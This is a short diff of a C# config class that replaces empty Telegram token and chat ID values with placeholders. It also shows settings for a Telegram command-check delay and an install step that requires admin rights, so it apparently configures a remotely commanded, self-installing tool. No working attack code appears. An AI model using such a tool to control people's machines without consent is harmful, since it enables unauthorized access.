@@ -3,8 +3,8 @@
     internal class config
     {
         // Telegram:
-        public const string TelegramToken = "";
-        public const string TelegramChatID = "";
+        public const string TelegramToken = "TELEGRAM_TOKEN_HERE";
+        public const string TelegramChatID = "TELEGRAM_CHAT_ID_HERE";
         public static int TelegramCommandCheckDelay = 1;
         // Install:
         public static bool AdminRightsRequired = true;
